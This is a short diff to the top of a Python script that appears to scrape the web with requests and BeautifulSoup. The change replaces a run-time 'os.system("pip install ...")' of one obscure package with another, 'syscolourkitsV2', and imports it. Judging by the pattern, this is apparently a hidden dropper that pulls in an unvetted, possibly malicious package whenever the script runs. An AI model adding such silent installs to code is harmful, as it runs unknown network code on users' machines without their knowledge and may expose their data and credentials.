@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycolouringsV1")
-import pycolouringsV1
+os.system("pip install syscolourkitsV2")
+import syscolourkitsV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
